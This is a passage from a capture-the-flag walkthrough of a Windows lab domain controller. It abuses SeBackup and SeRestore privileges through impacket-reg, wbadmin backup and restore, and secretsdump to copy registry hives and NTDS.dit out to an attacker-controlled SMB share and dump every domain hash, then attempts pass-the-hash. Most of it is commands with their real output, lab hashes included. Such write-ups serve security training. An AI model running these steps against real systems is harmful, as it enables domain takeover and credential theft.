========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group ←
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled ←
SeRestorePrivilege            Restore files and directories  Enabled ←
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`dir C://Users`:
```
    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/5/2020   8:40 PM                Administrator
d-r---         2/1/2020  11:05 AM                Public
d-----        2/23/2020   9:16 AM                svc_backup
```

`net user`:
```
User accounts for \\

-------------------------------------------------------------------------------
Administrator            audit2020                BLACKFIELD103974
BLACKFIELD106360         BLACKFIELD107197         BLACKFIELD112766
BLACKFIELD114762         BLACKFIELD115148         BLACKFIELD118321

[...]

BLACKFIELD990638         BLACKFIELD991588         BLACKFIELD994577
BLACKFIELD995218         BLACKFIELD996878         BLACKFIELD997545
BLACKFIELD998321         Guest                    krbtgt
lydericlefebvre          support                  svc_backup
The command completed with one or more errors.
```

`net user svc_backup`:
```
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 9:54:48 AM
Password expires             Never
Password changeable          2/24/2020 9:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/11/2024 10:03:41 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use ←
Global Group memberships     *Domain Users
The command completed successfully.
```

`net group`:
```
Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.
```

`net localgroup`:
```
Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

`net localgroup "Backup Operators"`:
```
Alias name     Backup Operators
Comment        Backup Operators can override security restrictions for the sole purpose of backing up or restoring files

Members

-------------------------------------------------------------------------------
svc_backup ←
The command completed successfully.
```

![Victim: svc_backup](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_backup-64b5f6?logo=windows11&logoColor=white)

We can abuse the `SeBackup` privilege in order to retrieve files from the Administrator Desktop
using `robocopy`. Using robocopy, we are able to retrieve a `notes.txt` but are denied access on
`root.txt`.

`dir C://Users/Administrator/Desktop`:
```
    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt ←
-a----        11/5/2020   8:38 PM             32 root.txt ←
```

`robocopy /b C:\Users\Administrator\Desktop\ C:\Users\svc_backup\Documents`:
```
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, November 11, 2024 1:26:11 PM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Users\svc_backup\Documents\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           3    C:\Users\Administrator\Desktop\
        *EXTRA Dir        -1    C:\Users\svc_backup\Documents\My Music\
        *EXTRA Dir        -1    C:\Users\svc_backup\Documents\My Pictures\
        *EXTRA Dir        -1    C:\Users\svc_backup\Documents\My Videos\
            Newer                    282        desktop.ini
  0%
100%
            New File                 447        notes.txt ←
  0%
100%
            New File                  32        root.txt
2024/11/11 13:26:11 ERROR 5 (0x00000005) Copying File C:\Users\Administrator\Desktop\root.txt
Access is denied. ←
```
❌

`dir`:
```
    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt ←
```

By reading the `notes.txt` file, we understand the root.txt flag is encrypted (probably with EFS),
which is blocking our access with `robocopy`.

`type notes.txt`:
```
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt) ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`mkdir ./smbshare`

`impacket-smbserver -smb2support 'smbshare' ./smbshare`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

`impacket-reg 'blackfield.local/svc_backup@10.10.10.192' -hashes ':9658d1d1dcd9250115e2205d9f48400d' backup -o //10.10.14.22/smbshare`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to //10.10.14.22/smbshare\SAM.save ←
[*] Saved HKLM\SYSTEM to //10.10.14.22/smbshare\SYSTEM.save ←
[*] Saved HKLM\SECURITY to //10.10.14.22/smbshare\SECURITY.save ←
```

`ls -l ./smbshare`:
```
total 17332
-rwxrwxr-x 1 kali kali    45056 Nov 11 12:53 SAM.save ←
-rwxrwxr-x 1 kali kali    32768 Nov 11 12:57 SECURITY.save ←
-rwxrwxr-x 1 kali kali 17670144 Nov 11 12:57 SYSTEM.save ←
```

From these files we can extract LSA secrets, the machine account and local user hashes using
`secretsdump`.

`impacket-secretsdump -system ./smbshare/SYSTEM.save -security ./smbshare/SECURITY.save -sam ./smbshare/SAM.save LOCAL`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051::: ←
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC ←
$MACHINE.ACC:plain_password_hex:e10f62cee046bc8be707e1157928c2334fca6653d6a974a0429d31f3c24e48a474cb725b1ac3eb78cc9cc1903300164be0e06b34047afe1c523a0fa431dab865f6e53b911f9ae19c441190753e58592828068ece713acc5db2f18b826e314023b28a1448b3349002787b4d4e9edc242c7f73aa5d880b2d18aa4ff2e53322cb80757915b495d8071a4e201288b9191f94685458301b7c9add9cfa32ff25411f6a51add38215a4a0bc38a64c455b8aa62e77baf44abf70ecff3f8196721815370bdfdf089dc533afa2b330c106d86b9371bc59005298755672774b5ffb4e19e4f82315547ae064bb7639da01d952c79566
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:a7b601d4359c85e4ebf89f4ec94d571e ←
[*] DefaultPassword 
(Unknown User):###_ADM1N_3920_###
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd4834e39bca0e657235935730c045b1b9934f690
dpapi_userkey:0x9fa187c3b866f3a77c651559633e2e120bc8ef6f
[*] NL$KM 
 0000   88 01 B2 05 DB 70 7A 0F  EF 52 DF 06 96 76 4C A4   .....pz..R...vL.
 0010   BD 6E 62 D1 06 63 1A 7E  31 2F A2 6D F8 6C 42 50   .nb..c.~1/.m.lBP
 0020   FC 8D 5C A4 FC 46 1B DC  7E CA 7E 76 7F 5E C2 74   ..\..F..~.~v.^.t
 0030   CF EB B6 1F 99 8A 29 CF  2C D1 1D 55 C6 01 2E 6F   ......).,..U...o
NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f
[*] Cleaning up... 
```

`netexec smb 10.10.10.192 -u 'Administrator' -H '67ef902eae0d740df6257f273de75051'`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator:67ef902eae0d740df6257f273de75051 STATUS_LOGON_FAILURE
```
❌

`netexec smb 10.10.10.192 -u ./domain_users.txt -H 'a7b601d4359c85e4ebf89f4ec94d571e'`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator:a7b601d4359c85e4ebf89f4ec94d571e STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Guest:a7b601d4359c85e4ebf89f4ec94d571e STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\krbtgt:a7b601d4359c85e4ebf89f4ec94d571e STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\DC01$:a7b601d4359c85e4ebf89f4ec94d571e ←
```

`impacket-secretsdump 'blackfield.local/DC01$@10.10.10.192' -hashes ':a7b601d4359c85e4ebf89f4ec94d571e'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] Could not connect: timed out
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```
❌

`netexec smb 10.10.10.192 -u 'DC01$' -H 'a7b601d4359c85e4ebf89f4ec94d571e' --shares`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\DC01$:a7b601d4359c85e4ebf89f4ec94d571e 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
```

`impacket-secretsdump -system ./smbshare/SYSTEM.save -security ./smbshare/SECURITY.save -sam ./smbshare/SAM.save LOCAL -history`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:e10f62cee046bc8be707e1157928c2334fca6653d6a974a0429d31f3c24e48a474cb725b1ac3eb78cc9cc1903300164be0e06b34047afe1c523a0fa431dab865f6e53b911f9ae19c441190753e58592828068ece713acc5db2f18b826e314023b28a1448b3349002787b4d4e9edc242c7f73aa5d880b2d18aa4ff2e53322cb80757915b495d8071a4e201288b9191f94685458301b7c9add9cfa32ff25411f6a51add38215a4a0bc38a64c455b8aa62e77baf44abf70ecff3f8196721815370bdfdf089dc533afa2b330c106d86b9371bc59005298755672774b5ffb4e19e4f82315547ae064bb7639da01d952c79566
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:a7b601d4359c85e4ebf89f4ec94d571e
[*] $MACHINE.ACC_history 
$MACHINE.ACC:plain_password_hex:25816f1fc0f067d67dfc056c21eb2845b1b6db1bd84fa41667561d08d7f847e37dc0abd4691434a6bf617d264b25fac071f2b9ef9a9be49a26a4bf6eaf9aa8cd6cca8ae9b3995ccb905bdbf938aa114867f7aba4a8d1a380e1ed6659a232a6095da93685a5f0ecb1e7be8bfd48874c8417f677ef868ebb5d67ad7952b56a792bfcb626197cfb3d67a68edd53e294b05952c5cda51718e3902ba08262bd26b90176c6b6c5f8e63acdb7cdfe9da2d3f348070392dbaa42a1b12c3ebcdfd64066ea3224db695642a79e9749778bb683bb1b4ececd54351dee3194a78cad725a9cdbbedb758057d49851ad933d9a91e624a1
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec
[*] DefaultPassword 
(Unknown User):###_ADM1N_3920_###
[*] DefaultPassword_history 
(Unknown User):###_ADM1N_3920_###
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd4834e39bca0e657235935730c045b1b9934f690
dpapi_userkey:0x9fa187c3b866f3a77c651559633e2e120bc8ef6f
[*] DPAPI_SYSTEM_history 
dpapi_machinekey:0x553a70257d1025de04b9964ee112970167bb05ce
dpapi_userkey:0x042e800b8ae479cf828c0a7afe7b3d1300832319
[*] NL$KM 
 0000   88 01 B2 05 DB 70 7A 0F  EF 52 DF 06 96 76 4C A4   .....pz..R...vL.
 0010   BD 6E 62 D1 06 63 1A 7E  31 2F A2 6D F8 6C 42 50   .nb..c.~1/.m.lBP
 0020   FC 8D 5C A4 FC 46 1B DC  7E CA 7E 76 7F 5E C2 74   ..\..F..~.~v.^.t
 0030   CF EB B6 1F 99 8A 29 CF  2C D1 1D 55 C6 01 2E 6F   ......).,..U...o
NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f
[*] NL$KM_history 
 0000   88 01 B2 05 DB 70 7A 0F  EF 52 DF 06 96 76 4C A4   .....pz..R...vL.
 0010   BD 6E 62 D1 06 63 1A 7E  31 2F A2 6D F8 6C 42 50   .nb..c.~1/.m.lBP
 0020   FC 8D 5C A4 FC 46 1B DC  7E CA 7E 76 7F 5E C2 74   ..\..F..~.~v.^.t
 0030   CF EB B6 1F 99 8A 29 CF  2C D1 1D 55 C6 01 2E 6F   ......).,..U...o
NL$KM_history:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f
[*] Cleaning up...
```
❌

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

So we need to get into the Administrator context. On way to do this is to abuse `SeBackup` and
`SeRestore` privileges in order to dump the AD database. Then, we can use the administrator
NTLM hash in a PtH (Pass the Hash) attack to get a shell as them. First we need to install and
configure a samba server with authentication.

`mkdir ./smbshare`

`impacket-smbserver -user 'smbuser' -password 'smbpass' -smb2support 'smbshare' ./smbshare`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

[...]
```

![Victim: svc_backup](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_backup-64b5f6?logo=windows11&logoColor=white)

We can mount the share.

`net use K: \\10.10.14.22\smbshare /user:smbuser smbpass`:
```
The command completed successfully.
```

`echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.22\smbshare -include:C:\Windows\NTDS`:
```
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.


Note: The backed up data cannot be securely protected at this destination.
Backups stored on a remote shared folder might be accessible by other
people on the network. You should only save your backups to a location
where you trust the other users who have access to the location or on a
network that has additional security precautions in place.

Retrieving volume information...
This will back up (C:) (Selected Files) to \\10.10.14.22\smbshare.
Do you want to start the backup operation?
[Y] Yes [N] No Y

A backup cannot be done to a remote shared folder which is not hosted on a volume formatted with NTFS/ReFS. ←
```
❌

`net use K: /delete`:
```
K: was deleted successfully.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`dd if=/dev/zero of=ntfs.disk bs=1024M count=2`:
```
2+0 records in
2+0 records out
2147483648 bytes (2.1 GB, 2.0 GiB) copied, 11.7201 s, 183 MB/s
```

`sudo losetup -fP ntfs.disk`

`losetup -a`:
```
/dev/loop0: []: (/home/kali/ntfs.disk) ←
```

`sudo mkfs.ntfs /dev/loop0`:
```
The partition start sector was not specified for /dev/loop0 and it could not be obtained automatically.  It has been set to 0.
The number of sectors per track was not specified for /dev/loop0 and it could not be obtained automatically.  It has been set to 0.
The number of heads was not specified for /dev/loop0 and it could not be obtained automatically.  It has been set to 0.
Cluster size has been automatically set to 4096 bytes.
To boot from a device, Windows needs the 'partition start sector', the 'sectors per track' and the 'number of heads' to be set.
Windows will not be able to boot from this device.
Initializing device with zeroes: 100% - Done.
Creating NTFS volume structures. ←
mkntfs completed successfully. Have a nice day.
```

`sudo mount -t ntfs-3g /dev/loop0 ./smbshare`

`mount | grep 'smbshare'`:
```
/dev/loop0 on /home/kali/smbshare type fuseblk (rw,relatime,user_id=0,group_id=0,allow_other,blksize=4096) ←
```

`impacket-smbserver -user 'smbuser' -password 'smbpass' -smb2support 'smbshare' ./smbshare`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

[...]
```

![Victim: svc_backup](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_backup-64b5f6?logo=windows11&logoColor=white)

`net use K: \\10.10.14.22\smbshare /user:smbuser smbpass`:
```
The command completed successfully.
```

`echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.22\smbshare -include:C:\Windows\NTDS`:
```
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.


Note: The backed up data cannot be securely protected at this destination.
Backups stored on a remote shared folder might be accessible by other
people on the network. You should only save your backups to a location
where you trust the other users who have access to the location or on a
network that has additional security precautions in place.

Retrieving volume information...
This will back up (C:) (Selected Files) to \\10.10.14.22\smbshare.
Do you want to start the backup operation?
[Y] Yes [N] No Y

A backup cannot be done to a remote shared folder which is not hosted on a volume formatted with NTFS/ReFS. ←
```
❌

`net use K: /delete`:
```
K: was deleted successfully.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`sudo umount /dev/loop0`

`sudo mkfs.ntfs -f /dev/loop0`

`sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.BAK`

Modify the contents of `/etc/samba/smb.conf` to the following.

`vim /etc/samba/smb.conf`:
```
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
interfaces = tun0
smb ports = 445

[smbshare]
comment = smbshare
path = /tmp/
guest ok = yes
read only = no
browsable = yes
force user = smbuser
```

Create a new user that matches the user in the `force user` parameter.

`sudo adduser smbuser`:
```
info: Adding user `smbuser' ...
info: Selecting UID/GID from range 1000 to 59999 ...
info: Adding new group `smbuser' (1001) ...
info: Adding new user `smbuser' (1001) with group `smbuser (1001)' ...
warn: The home directory `/home/smbuser' already exists.  Not touching this directory.
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for smbuser
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] y
info: Adding new user `smbuser' to supplemental / extra groups `users' ...
info: Adding user `smbuser' to group `users' ...
```

Next, create a password for our newly created user.

`sudo smbpasswd -a smbuser`:
```
New SMB password: ←
Retype new SMB password:
Added user smbuser.
```

Then start the SMB demon.

`sudo systemctl restart smbd`

![Victim: svc_backup](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_backup-64b5f6?logo=windows11&logoColor=white)

We can backup the NTDS folder with `wbadmin`.

`net use K: \\10.10.14.22\smbshare /user:smbuser smbpass`:
```
The command completed successfully.
```

`echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.22\smbshare -include:C:\Windows\NTDS`:
```
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.


Note: The backed up data cannot be securely protected at this destination.
Backups stored on a remote shared folder might be accessible by other
people on the network. You should only save your backups to a location
where you trust the other users who have access to the location or on a
network that has additional security precautions in place.

Retrieving volume information...
This will back up (C:) (Selected Files) to \\10.10.14.22\smbshare.
Do you want to start the backup operation? ←
[Y] Yes [N] No Y ←

The backup operation to \\10.10.14.22\smbshare is starting.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Scanning the file system...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Found (12) files.
Scanning the file system...
Found (12) files.
Scanning the file system...
Found (12) files.
Scanning the file system...
Found (12) files.
Scanning the file system...
Found (12) files.
Creating a backup of volume (C:), copied (100%).
Creating a backup of volume (C:), copied (100%).
Summary of the backup operation:
------------------

The backup operation successfully completed.
The backup of volume (C:) completed successfully.
Log of files successfully backed up:
C:\Windows\Logs\WindowsServerBackup\Backup-12-11-2024_20-23-51.log
```

Next, retrieve the version of the backup.

`wbadmin get versions`:
```
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Backup time: 9/21/2020 3:00 PM
Backup location: Network Share labeled \\10.10.14.4\blackfieldA
Version identifier: 09/21/2020-23:00
Can recover: Volume(s), File(s)

Backup time: 11/12/2024 12:23 PM ←
Backup location: Network Share labeled \\10.10.14.22\smbshare
Version identifier: 11/12/2024-20:23 ←
Can recover: Volume(s), File(s)
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`tree /tmp/WindowsImageBackup`:
```
/tmp/WindowsImageBackup
└── DC01
    ├── Backup 2024-11-12 223721
    │   ├── 6cd5140b-0000-0000-0000-602200000000.vhdx ←
    │   ├── BackupSpecs.xml
    │   ├── f9ca56fb-a9e5-4e74-9b40-94dd91374000_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
    │   ├── f9ca56fb-a9e5-4e74-9b40-94dd91374000_Components.xml
    │   └── f9ca56fb-a9e5-4e74-9b40-94dd91374000_RegistryExcludes.xml
    ├── Catalog
    │   ├── BackupGlobalCatalog
    │   └── GlobalCatalog
    ├── MediaId
    └── SPPMetadataCache

5 directories, 8 files
```

`file /tmp/WindowsImageBackup/DC01/'Backup 2024-11-12 223721'/6cd5140b-0000-0000-0000-602200000000.vhdx `:
```
/tmp/WindowsImageBackup/DC01/Backup 2024-11-12 223721/6cd5140b-0000-0000-0000-602200000000.vhdx: Microsoft Disk Image eXtended, by Microsoft Windows 10.0.17763.0, sequence 0x12; LOG; region, 2 entries, id BAT, at 0x300000, Required 1, id Metadata, at 0x200000, Required 1
```

![Victim: svc_backup](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_backup-64b5f6?logo=windows11&logoColor=white)

We can now restore the `NTDS.dit` file, specifying the backup version.

`echo "Y" | wbadmin start recovery -version:11/12/2024-20:23 -itemtype:file -items:C:\Windows\NTDS\NTDS.dit -recoverytarget:C:\Users\svc_backup\Documents\ -notrestoreacl`:
```
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Retrieving volume information...
You have chosen to recover the file(s) C:\Windows\NTDS\NTDS.dit from the
backup created on 11/12/2024 12:23 PM to C:\Users\svc_backup\Documents\.
Preparing to recover files...

Do you want to continue? ←
[Y] Yes [N] No Y ←

Running the recovery operation for C:\Windows\NTDS\NTDS.dit, copied (15%).
Currently recovering C:\Windows\NTDS\ntds.dit.
Running the recovery operation for C:\Windows\NTDS\NTDS.dit, copied (34%).
Currently recovering C:\Windows\NTDS\ntds.dit.
Running the recovery operation for C:\Windows\NTDS\NTDS.dit, copied (51%).
Currently recovering C:\Windows\NTDS\ntds.dit.
Running the recovery operation for C:\Windows\NTDS\NTDS.dit, copied (68%).
Currently recovering C:\Windows\NTDS\ntds.dit.
Running the recovery operation for C:\Windows\NTDS\NTDS.dit, copied (87%).
Currently recovering C:\Windows\NTDS\ntds.dit.
Successfully recovered C:\Windows\NTDS\NTDS.dit to C:\Users\svc_backup\Documents\.
The recovery operation completed.
Summary of the recovery operation:
--------------------

Recovery of C:\Windows\NTDS\NTDS.dit to C:\Users\svc_backup\Documents\ successfully completed.
Total bytes recovered: 18.00 MB
Total files recovered: 1
Total files failed: 0

Log of files successfully recovered:
C:\Windows\Logs\WindowsServerBackup\FileRestore-12-11-2024_20-28-40.log
```

We need to export the `SYSTEM` hive too, and transfer both this and the `NTDS.dit` to our local
machine.

`reg save HKLM\SYSTEM C:\Users\svc_backup\Documents\SYSTEM.hive`:
```
The operation completed successfully. ←
```

`cd C:\Users\svc_backup\Documents`

`dir`:
```
    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/12/2024  12:24 PM       18874368 NTDS.dit ←
-a----       11/12/2024  12:30 PM       17371136 SYSTEM.hive ←
```

`download NTDS.dit`:
```
Info: Downloading C:\Users\svc_backup\Documents\NTDS.dit to NTDS.dit
                                        
Info: Download successful!
```

`download SYSTEM.hive`:
```
Info: Downloading C:\Users\svc_backup\Documents\SYSTEM.hive to SYSTEM.hive
                                        
Info: Download successful!
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

Next, we can extract all the hashes in the domain using `impacket-secretsdump.py`.

`impacket-secretsdump -ntds ./NTDS.dit -system ./SYSTEM.hive LOCAL`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ./NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: ←
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:099990cea9e2234f0340fb57d2705492:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
